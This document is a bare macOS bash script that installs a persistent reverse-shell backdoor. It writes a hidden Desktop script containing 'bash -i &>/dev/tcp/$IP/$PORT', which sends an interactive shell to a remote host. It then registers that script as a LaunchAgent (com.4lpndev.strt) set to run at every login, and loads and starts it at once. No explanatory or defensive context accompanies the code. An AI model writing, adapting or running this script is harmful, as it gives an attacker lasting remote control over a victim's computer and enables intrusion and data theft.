#!/bin/bash

USR=$(whoami)

echo "#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
" > /Users/$USR/Desktop/.runonstartupMACOS.sh

chmod +x /Users/$USR/Desktop/.runonstartupMACOS.sh

cat <<EOF > ~/Library/LaunchAgents/com.4lpndev.strt.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.4lpndev.strt</string>
    <key>ProgramArguments</key>
    <array>
      <string>/Users/$USR/Desktop/.runonstartupMACOS.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/mylogfile.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/myerrorlogfile.log</string>
  </dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.4lpndev.strt.plist

launchctl start com.4lpndev.strt
